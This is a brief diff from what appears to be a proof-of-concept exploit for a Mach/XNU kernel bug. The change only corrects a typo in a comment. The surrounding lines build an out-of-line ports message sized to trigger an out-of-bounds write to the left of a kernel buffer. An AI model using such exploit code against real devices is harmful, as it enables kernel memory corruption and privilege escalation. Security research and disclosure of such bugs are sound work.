@@ -84,7 +84,7 @@ void poc() {
     
     // set up an OOL ports message
     // make the size N_CORRUPTED because it's bigger, otherwise the message won't send and return an error.
-    // this will make the allocation bigger but we don't care about tha as the out of bounds will be done to the left of the buffer, not to the right
+    // this will make the allocation bigger but we don't care about that as the out of bounds will be done to the left of the buffer, not to the right
     msg = (struct ool_msg*)calloc(1, sizeof(struct ool_msg) + sizeof(mach_msg_ool_ports_descriptor_t) * N_CORRUPTED);
     
     msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
